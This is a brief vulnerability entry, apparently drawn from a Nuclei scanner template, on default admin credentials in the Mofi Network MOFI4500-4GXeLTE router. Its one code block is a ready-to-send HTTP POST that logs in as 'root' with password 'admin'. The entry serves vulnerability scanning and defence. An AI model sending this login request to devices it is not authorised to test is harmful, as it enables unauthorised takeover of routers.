# Vulnerability: MOFI4500-4GXeLTE-V2 Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`mofi4500-default-login.yaml`)

## Description
Mofi Network MOFI4500-4GXELTE wireless router default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /cgi-bin/luci/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=root&password=admin
```

